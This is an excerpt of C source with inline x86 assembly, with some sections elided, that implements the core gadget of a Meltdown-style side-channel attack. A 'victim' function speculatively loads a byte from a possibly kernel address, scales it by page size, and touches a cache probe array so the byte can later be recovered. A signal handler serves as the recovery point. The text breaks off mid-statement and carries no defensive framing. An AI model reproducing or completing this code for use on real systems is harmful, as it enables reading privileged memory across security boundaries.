...
/* Define a real C function as the safe return point for the signal handler.
   This guarantees we can take its address in portable way. */
...
static void __attribute__((noinline)) victim(unsigned long addr)
{
    asm volatile(
        ...
        /* load a byte from the (possibly kernel) address into eax */
        "movzx (%[addr]), %%eax\n\t"
        /* use rax as index after shifting */
        "shl $12, %%rax\n\t"
        "jz 1b\n\t"
        /* touch channel + rax; use ebx as 32-bit target for movzx */
        "movzx (%[target], %%rax, 1), %%ebx\n\t"

        /* local label to mark stop point (not strictly necessary) */
        "2:\n\t"
        "nop\n\t"
        :
        : [target] "r"(channel),
